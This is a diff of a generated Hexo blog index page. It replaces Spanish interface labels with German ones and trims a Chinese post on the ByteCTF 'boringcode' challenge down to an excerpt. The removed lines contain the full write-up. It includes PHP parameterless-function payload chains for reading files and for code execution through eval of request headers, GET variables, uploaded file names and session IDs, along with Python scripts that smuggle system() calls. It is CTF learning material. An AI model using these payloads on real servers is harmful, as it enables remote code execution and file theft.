@@ -47,9 +47,9 @@
     path: '',
     motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
     translation: {
-      copy_button: 'Copiar',
-      copy_success: 'Copiado',
-      copy_failure: 'Copiar falló'
+      copy_button: 'Kopieren',
+      copy_success: 'Kopiert',
+      copy_failure: 'Kopieren fehlgeschlagen'
     }
   };
 </script>
@@ -146,7 +146,7 @@
   </div>
 
   <div class="site-nav-toggle">
-    <button aria-label="Cambiar a barra de navegación">
+    <button aria-label="Navigationsleiste an/ausschalten">
       <span class="btn-bar"></span>
       <span class="btn-bar"></span>
       <span class="btn-bar"></span>
@@ -166,7 +166,7 @@
       
     
 
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Inicio</a>
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
 
   </li>
       
@@ -177,7 +177,7 @@
       
     
 
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archivo</a>
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
 
   </li>
       
@@ -235,13 +235,13 @@
               <span class="post-meta-item-icon">
                 <i class="fa fa-calendar-o"></i>
               </span>
-              <span class="post-meta-item-text">Publicado el</span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
 
               
                 
               
 
-              <time title="Creado por: 2019-09-15 17:12:31 / Modificado por: 17:12:08" itemprop="dateCreated datePublished" datetime="2019-09-15T17:12:31+08:00">2019-09-15</time>
+              <time title="Erstellt: 2019-09-15 17:12:31 / Geändert am: 17:16:26" itemprop="dateCreated datePublished" datetime="2019-09-15T17:12:31+08:00">2019-09-15</time>
             </span>
           
             
@@ -252,7 +252,7 @@
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
               </span>
-              <span class="post-meta-item-text">En</span>
+              <span class="post-meta-item-text">in</span>
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Learning/" itemprop="url" rel="index"><span itemprop="name">Learning</span></a></span>
 
@@ -277,178 +277,19 @@
 <p>这次通过ALTM4NZ师傅的wp来分析一下boringcode这道题并学习一下无参数函数的利用。</p>
 <h2 id="boringcode"><a href="#boringcode" class="headerlink" title="boringcode"></a>boringcode</h2><p>看一下代码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_url</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/data:\/\//i'</span>, $url)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_valid_url($url)) &#123;</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/baidu\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">            $code = file_get_contents($url);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">eval</span>($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error: host not allowed"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error: invalid url"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这个页面的作用是，接受一个url参数，利用file_get_content远程获取url页面的源码，传递给eval执行。但在url传递和源码传递过程中有各种检测。</p>
-<h3 id="第一个点："><a href="#第一个点：" class="headerlink" title="第一个点："></a>第一个点：</h3><ol>
-<li>is_valid_url()函数来检测url的正确性，并禁止使用data协议。</li>
-<li>url的host必须以baidu.com结尾。</li>
-</ol>
-<p>绕过：</p>
-<p>如果data协议没有被绕过，则可以使用：<code>data://baidu.com/plain;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo=</code> 来进行绕过。</p>
-<p>这里把data协议禁止了之后，想要利用伪协议绕过的话近乎无解。只想到购买域名来进行绕过，比如threezh1baidu.com。 (还好没买! 买了也做不出来。)</p>
-<h3 id="第二个点："><a href="#第二个点：" class="headerlink" title="第二个点："></a>第二个点：</h3><ol>
-<li>由<code>preg_replace(&#39;/[a-z]+\((?R)?\)/&#39;</code>可知，这里只允许无参数的函数传递进来。并且函数名只能为字母，不能包含下划线等其他特殊字符。</li>
-<li>过滤了很多的关键字：<code>et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log</code></li>
-</ol>
-<p>这里绕过没做出来，学习大佬是怎么做这题的。</p>
-<p>绕过：</p>
-<p><code>preg_replace(&#39;/[a-z]+\((?R)?\)/&#39;</code>虽然只允许无参数，但是允许函数套用。正则表达式匹配情况：</p>
-<p><img src="https://i.loli.net/2019/09/15/jOkhe2V7z8w4U6G.jpg" alt="zhengze01.jpg"></p>
-<p><img src="https://i.loli.net/2019/09/15/JhI3Ny8GPdl9Z7L.jpg" alt="zhengze02.jpg"></p>
-<p><img src="https://i.loli.net/2019/09/15/gGmqzhT8APHunaN.jpg" alt="zhengze03.jpg"></p>
-<p>通过这样的嵌套，就能构造出payload进行读取文件操作，在特殊情况下还可以进行RCE。这题只能读取文件。</p>
-<ul>
-<li><strong>第一种方式：</strong></li>
-</ul>
-<p>参考：<a href="http://peanuts2ao.top/2019/09/09/2019-ByteCTF-pwn/" target="_blank" rel="noopener">ByteCTF_WEB</a></p>
-<p>来看这个师傅的Payload：</p>
-<p><code>echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</code></p>
-<p>payload很长，第一次看的的时候吓了一跳。 来看看他是怎么通过这个payload获取到flag了吧。</p>
-<p>因为环境已经关了，所以我在在本地搭了一个环境。 </p>
-<p>WWW/flag  flag文件</p>
-<p>WWW/code/code.php:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">'code'</span>])&#123;</span><br><span class="line">	$code = $_POST[<span class="string">'code'</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line">	    <span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line">	        <span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">	    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	        <span class="keyword">eval</span>($code);</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"No No No"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>先来看这几个函数：</p>
-<pre><code>scandir()    列出 images 目录中的文件和目录。
-end()        将内部指针指向数组中的最后一个元素，并输出。
-readfile()  输出一个文件
-</code></pre><p>scandir()接受一个目录地址的参数，当传递为一个”.”时，则会返回一个数组包含当前目录下的目录名和文件名。</p>
-<p>那构造<code>readfile(end(scandir(&#39;.&#39;)));</code>就会读取到当前目录下最后一个文件。</p>
-<p>如果把函数参数检测关掉的话，返回的内容为code.php的源码：</p>
-<p><img src="https://i.loli.net/2019/09/15/MYdEGq9et7SRUsX.jpg" alt="yuanma01.jpg"></p>
-<p>这题因为不能附带参数，所以需要寻找一个函数能生成一个”.”。于是找到了</p>
-<pre><code>localeconv()   函数返回一包含本地数字及货币格式信息的数组。
-</code></pre><p>这个函数会返回：</p>
-<pre><code>array(18) {
-  [&quot;decimal_point&quot;]=&gt;
-  string(1) &quot;.&quot;
-  [&quot;thousands_sep&quot;]=&gt;
-  string(0) &quot;&quot;
-  [&quot;int_curr_symbol&quot;]=&gt;
-  ....
-</code></pre><p>数组中第一个值就是”.”。再通过下面两个函数可以构造:<code>current(localeconv())</code>或者<code>pos(localeconv())</code>。因为这里还过滤en，所以就选择了后者。</p>
-<pre><code>current()        返回数组中的当前单元, 默认取第一个值
-pos()            current() 的别名 
-</code></pre><p>这时，我们就可以获取到当前目录的最后一个文件了,payload为：</p>
-<p><code>readfile(end(scandir(pos(localeconv()))));</code></p>
-<p>因为flag是在上一个目录，所以我们还需要使用<code>chdir()</code> <code>next()</code>来重新定义一下php当前目录，再使用readfile进行读取文件。</p>
-<pre><code>chdir() 函数改变当前的目录。
-next() 函数将内部指针指向数组中的下一个元素，并输出。 这里可以获取到scandir()返回的&quot;..&quot;
-</code></pre><p>将目录定义为上一目录：<code>chdir(next(scandir(pos(localeconv()))))</code></p>
-<p>但是chdir()函数执行成功之后不会返回当前目录，只会返回”1”。 如前面读文件一样，我们还是需要一个”.”来读取flag。</p>
-<p>ALTM4NZ师傅找到了一个很骚的操作，就是使用<code>localtime()</code>配合<code>chr</code>来获取一个”.”。</p>
-<pre><code>localtime() 函数返回本地时间。返回的类型为关联数组
-
-    关联数组的键名如下：
-
-    [tm_sec] - 秒数
-    [tm_min] - 分钟数
-    [tm_hour] - 小时
-    ...
-
-chr() 函数从指定的 ASCII 值返回字符。
-</code></pre><p>获取”.”的payload：<code>chr(pos(localtime()))</code></p>
-<p>当时间为某一分钟的46秒时, pos(localtime())返回46。46是”.”的ASCII码值。所以payload就会返回”.”</p>
-<p>但这里存在一个问题就是localtime()参数只接受时间戳。</p>
-<p><img src="https://i.loli.net/2019/09/15/L76jp2Dg4aCJKVu.jpg" alt="localtime.jpg"></p>
-<p>所以这里需要使用time()来解决。time()不会受参数的影响并且会返回一个时间戳。</p>
-<p>至此，我们的payload就为：</p>
-<p><code>chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))</code></p>
-<p>在46秒的时候，就会返回”.”</p>
-<p><img src="https://i.loli.net/2019/09/15/xNwWGcYXgTE4B5y.jpg" alt="dian.jpg"></p>
-<p>再用前面读取文件的方式就可以在每分钟的46秒时读取到flag了。</p>
-<p><code>echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</code></p>
-<p><img src="https://i.loli.net/2019/09/15/RerdnaO2omz4xZG.jpg" alt="getflag.jpg"></p>
-<ul>
-<li><strong>第二种方式</strong></li>
-</ul>
-<p>这个payload是在群里面看到一个师傅发的。</p>
-<p><code>if(chdir(next(scandir(pos(localeconv())))))readfile(end(scandir(pos(localeconv()))));</code></p>
-<p>因为chdir()返回0和1，所以使用if来判断并执行后面语句进行读取文件。这样就不用使用localtime函数来获取”.”。可以直接读flag。</p>
-<p><img src="https://i.loli.net/2019/09/15/TqKNil54MIWwd2v.jpg" alt="getflag1.jpg"></p>
-<p>实现的函数在第一种方式都有。就不分析了。</p>
-<h2 id="无参数函数的利用总结"><a href="#无参数函数的利用总结" class="headerlink" title="无参数函数的利用总结"></a>无参数函数的利用总结</h2><p>环境：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_POST[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_POST[<span class="string">'code'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这里正则表达式和题目的区别在于这里还运行函数名称包含<code>_</code>等特殊字符。</p>
-<h3 id="获取环境变量"><a href="#获取环境变量" class="headerlink" title="获取环境变量"></a>获取环境变量</h3><p>使用getenv()获取超全局变量的数组，使用array_rand和array_flip爆破出所有的全局变量。</p>
-<pre><code>getenv()         获取一个环境变量的值(在7.1之后可以不给予参数)
-array_rand()     函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。
-array_flip()    array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。
-</code></pre><p>payload:</p>
-<p><code>echo(array_rand(array_flip(getenv())));</code></p>
-<p><img src="https://i.loli.net/2019/09/15/JT8QBimcpEboLZD.jpg" alt="payload1.jpg"></p>
-<h3 id="getallheaders-gt-RCE"><a href="#getallheaders-gt-RCE" class="headerlink" title="getallheaders() =&gt; RCE"></a>getallheaders() =&gt; RCE</h3><pre><code>getallheaders()        获取全部 HTTP 请求头信息, 是下方函数的别名
-apache_request_headers    获取全部 HTTP 请求头信息
-这两个函数只适用于apache服务器
-</code></pre><p>函数返回内容：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">array(11) &#123;</span><br><span class="line">  [&quot;Accept-Language&quot;]=&gt;</span><br><span class="line">  string(23) &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;</span><br><span class="line">  [&quot;Accept-Encoding&quot;]=&gt;</span><br><span class="line">  string(17) &quot;gzip, deflate, br&quot;</span><br><span class="line">  [&quot;Accept&quot;]=&gt;</span><br><span class="line">  string(3) &quot;*/*&quot;</span><br><span class="line">  [&quot;Content-Type&quot;]=&gt;</span><br><span class="line">  string(68) &quot;multipart/form-data; boundary=----WebKitFormBoundaryevLOjNPCJPGbsCBf&quot;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>当我们构造一个Header时：</p>
-<p><img src="https://i.loli.net/2019/09/15/J3pxUcHf8mPziXl.jpg" alt="header1.jpg"></p>
-<p>添加一个Header为<code>test: phpinfo();</code>,根据位置选择合适的payload：</p>
-<ol>
-<li><p>添加在Header在第一个：</p>
-<p> payload: <code>code=eval(pos(getallheaders()));</code> </p>
-<p> (pos()可以换为current(). 如果在第二个可以使用next())</p>
-</li>
-<li><p>添加在Header在最后一个：</p>
-<p> payload: <code>code=eval(end(getallheaders()));</code></p>
-</li>
-<li><p>不知道位置：</p>
-<p> 配合<code>array_rand()</code>, <code>array_flip()</code>构造payload进行爆破：</p>
-<p> payload: <code>eval(array_rand(array_flip(getallheaders())));</code></p>
-</li>
-</ol>
-<p><img src="https://i.loli.net/2019/09/15/7j13wV54ZIsXxfr.jpg" alt="suijibaopo.jpg"></p>
-<h3 id="get-defined-vars-gt-RCE"><a href="#get-defined-vars-gt-RCE" class="headerlink" title="get_defined_vars() =&gt; RCE"></a>get_defined_vars() =&gt; RCE</h3><pre><code>get_defined_vars() 函数返回由所有已定义变量所组成的数组。
-</code></pre><p>和getallheaders()利用类似，但是不止apache, ngnix和其他的也可以用</p>
-<p>函数返回内容：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">array(4) &#123;</span><br><span class="line">  [&quot;_GET&quot;]=&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;_POST&quot;]=&gt;</span><br><span class="line">  array(1) &#123;</span><br><span class="line">    [&quot;code&quot;]=&gt;</span><br><span class="line">    string(29) &quot;var_dump(get_defined_vars());&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;_COOKIE&quot;]=&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;_FILES&quot;]=&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>会返回全局变量的值，如get、post、cookie、file数据。</p>
-<ol>
-<li>利用<code>$_GET</code></li>
-</ol>
-<p>url中添加参数：<a href="http://127.0.0.1/code/code.php?test=phpinfo()" target="_blank" rel="noopener">http://127.0.0.1/code/code.php?test=phpinfo()</a>;</p>
-<p>post数据：<code>eval(end(current(get_defined_vars())));</code></p>
-<p><img src="https://i.loli.net/2019/09/15/QZLUjoBDmVIGw6a.jpg" alt="getphpinfo.jpg"></p>
-<ol start="2">
-<li>利用<code>$_FILES</code></li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">"system('ping 127.0.0.1');"</span>: <span class="string">""</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">"code"</span>:<span class="string">"eval(pos(pos(end(get_defined_vars()))));"</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(<span class="string">'http://127.0.0.1/code/code.php'</span>, data=data, files=files)</span><br><span class="line">print(r.content.decode(<span class="string">"utf-8"</span>, <span class="string">"ignore"</span>))</span><br></pre></td></tr></table></figure>
-<p>把payload直接放在文件的名称上，再通过两个pos定位进行利用。</p>
-<p>也可以像sky师傅脚本里面那样进行编码，使用hex2bin()解码利用。</p>
-<p><img src="https://i.loli.net/2019/09/15/gUfjpJoySZiwHMh.jpg" alt="filephpinfo.jpg"></p>
-<h3 id="session-id-gt-RCE"><a href="#session-id-gt-RCE" class="headerlink" title="session_id() =&gt; RCE"></a>session_id() =&gt; RCE</h3><pre><code>session_id() 可以用来获取/设置 当前会话 ID。
-</code></pre><p>可以通过修改cookie来设置session，用<code>session_id()</code>读取进行利用。</p>
-<p>payload:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"system('ping 127.0.0.1');"</span></span><br><span class="line">payload = str(binascii.b2a_hex(payload.encode(<span class="string">'utf-8'</span>))).strip(<span class="string">"b"</span>).strip(<span class="string">"'"</span>)</span><br><span class="line">cookies=&#123;</span><br><span class="line">	<span class="string">"PHPSESSID"</span>: payload</span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">"code"</span>:<span class="string">"eval(hex2bin(session_id(session_start())));"</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(<span class="string">'http://127.0.0.1/code/code.php'</span>, data=data, cookies=cookies)</span><br><span class="line">print(r.content.decode(<span class="string">"utf-8"</span>, <span class="string">"ignore"</span>))</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2019/09/15/tARoWnCeYXZDVKb.jpg" alt="session.jpg"></p>
-<h3 id="无参数函数小总结"><a href="#无参数函数小总结" class="headerlink" title="无参数函数小总结"></a>无参数函数小总结</h3><p>这里是针对无参数函数利用来说的。</p>
-<pre><code>getchwd() 函数返回当前工作目录。
-scandir() 函数返回指定目录中的文件和目录的数组。
-dirname() 函数返回路径中的目录部分。
-chdir() 函数改变当前的目录。
-
-readfile()  输出一个文件
-
-current()       返回数组中的当前单元, 默认取第一个值
-pos()           current() 的别名
-next() 函数将内部指针指向数组中的下一个元素，并输出。
-end()       将内部指针指向数组中的最后一个元素，并输出。
-array_rand()    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。
-array_flip()    array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。
-
-chr() 函数从指定的 ASCII 值返回字符。
-hex2bin — 转换十六进制字符串为二进制字符串
-
-getenv()        获取一个环境变量的值(在7.1之后可以不给予参数)
-</code></pre><p>常见的就这么一些。先记录到这吧。</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
-<li><a href="http://peanuts2ao.top/2019/09/09/2019-ByteCTF-pwn/" target="_blank" rel="noopener">http://peanuts2ao.top/2019/09/09/2019-ByteCTF-pwn/</a></li>
-<li><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></li>
-</ul>
-
+<p>这个页面的作用是，接受一个url参数，利用file_get_content远程获取url页面的源码，传递给eval执行。但在url传递和源码传递过程中有各种检测。<br>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/09/15/boringcode/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
-    </div>
+    </p></div>
 
     
     
@@ -494,13 +335,13 @@ getenv()        获取一个环境变量的值(在7.1之后可以不给予参数
               <span class="post-meta-item-icon">
                 <i class="fa fa-calendar-o"></i>
               </span>
-              <span class="post-meta-item-text">Publicado el</span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
 
               
                 
               
 
-              <time title="Creado por: 2019-08-22 21:26:14" itemprop="dateCreated datePublished" datetime="2019-08-22T21:26:14+08:00">2019-08-22</time>
+              <time title="Erstellt: 2019-08-22 21:26:14" itemprop="dateCreated datePublished" datetime="2019-08-22T21:26:14+08:00">2019-08-22</time>
             </span>
           
             
@@ -510,8 +351,8 @@ getenv()        获取一个环境变量的值(在7.1之后可以不给予参数
                 <span class="post-meta-item-icon">
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
-                <span class="post-meta-item-text">Editado el</span>
-                <time title="Modificado por: 2019-08-23 14:10:46" itemprop="dateModified" datetime="2019-08-23T14:10:46+08:00">2019-08-23</time>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2019-08-23 14:10:46" itemprop="dateModified" datetime="2019-08-23T14:10:46+08:00">2019-08-23</time>
               </span>
             
           
@@ -519,7 +360,7 @@ getenv()        获取一个环境变量的值(在7.1之后可以不给予参数
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
               </span>
-              <span class="post-meta-item-text">En</span>
+              <span class="post-meta-item-text">in</span>
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Learning/" itemprop="url" rel="index"><span itemprop="name">Learning</span></a></span>
 
@@ -548,7 +389,7 @@ getenv()        获取一个环境变量的值(在7.1之后可以不给予参数
           
             <div class="post-button text-center">
               <a class="btn" href="/2019/08/22/简单的协程利用框架/#more" rel="contents">
-                Leer más &raquo;
+                Weiterlesen &raquo;
               </a>
             </div>
           
@@ -601,13 +442,13 @@ getenv()        获取一个环境变量的值(在7.1之后可以不给予参数
               <span class="post-meta-item-icon">
                 <i class="fa fa-calendar-o"></i>
               </span>
-              <span class="post-meta-item-text">Publicado el</span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
 
               
                 
               
 
-              <time title="Creado por: 2019-07-12 01:07:40" itemprop="dateCreated datePublished" datetime="2019-07-12T01:07:40+08:00">2019-07-12</time>
+              <time title="Erstellt: 2019-07-12 01:07:40" itemprop="dateCreated datePublished" datetime="2019-07-12T01:07:40+08:00">2019-07-12</time>
             </span>
           
             
@@ -617,8 +458,8 @@ getenv()        获取一个环境变量的值(在7.1之后可以不给予参数
                 <span class="post-meta-item-icon">
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
-                <span class="post-meta-item-text">Editado el</span>
-                <time title="Modificado por: 2019-08-23 14:18:20" itemprop="dateModified" datetime="2019-08-23T14:18:20+08:00">2019-08-23</time>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2019-08-23 14:18:20" itemprop="dateModified" datetime="2019-08-23T14:18:20+08:00">2019-08-23</time>
               </span>
             
           
@@ -626,7 +467,7 @@ getenv()        获取一个环境变量的值(在7.1之后可以不给予参数
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
               </span>
-              <span class="post-meta-item-text">En</span>
+              <span class="post-meta-item-text">in</span>
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Learning/" itemprop="url" rel="index"><span itemprop="name">Learning</span></a></span>
 
@@ -659,7 +500,7 @@ getenv()        获取一个环境变量的值(在7.1之后可以不给予参数
           
             <div class="post-button text-center">
               <a class="btn" href="/2019/07/12/Python动态加载模块的几种方式/#more" rel="contents">
-                Leer más &raquo;
+                Weiterlesen &raquo;
               </a>
             </div>
           
@@ -712,13 +553,13 @@ getenv()        获取一个环境变量的值(在7.1之后可以不给予参数
               <span class="post-meta-item-icon">
                 <i class="fa fa-calendar-o"></i>
               </span>
-              <span class="post-meta-item-text">Publicado el</span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
 
               
                 
               
 
-              <time title="Creado por: 2019-07-11 01:50:41" itemprop="dateCreated datePublished" datetime="2019-07-11T01:50:41+08:00">2019-07-11</time>
+              <time title="Erstellt: 2019-07-11 01:50:41" itemprop="dateCreated datePublished" datetime="2019-07-11T01:50:41+08:00">2019-07-11</time>
             </span>
           
             
@@ -728,8 +569,8 @@ getenv()        获取一个环境变量的值(在7.1之后可以不给予参数
                 <span class="post-meta-item-icon">
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
-                <span class="post-meta-item-text">Editado el</span>
-                <time title="Modificado por: 2019-08-23 14:19:20" itemprop="dateModified" datetime="2019-08-23T14:19:20+08:00">2019-08-23</time>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2019-08-23 14:19:20" itemprop="dateModified" datetime="2019-08-23T14:19:20+08:00">2019-08-23</time>
               </span>
             
           
@@ -737,7 +578,7 @@ getenv()        获取一个环境变量的值(在7.1之后可以不给予参数
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
               </span>
-              <span class="post-meta-item-text">En</span>
+              <span class="post-meta-item-text">in</span>
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/胡思乱想/" itemprop="url" rel="index"><span itemprop="name">胡思乱想</span></a></span>
 
@@ -778,7 +619,7 @@ getenv()        获取一个环境变量的值(在7.1之后可以不给予参数
           
             <div class="post-button text-center">
               <a class="btn" href="/2019/07/11/关于易语言与Python的一点想法/#more" rel="contents">
-                Leer más &raquo;
+                Weiterlesen &raquo;
               </a>
             </div>
           
@@ -831,13 +672,13 @@ getenv()        获取一个环境变量的值(在7.1之后可以不给予参数
               <span class="post-meta-item-icon">
                 <i class="fa fa-calendar-o"></i>
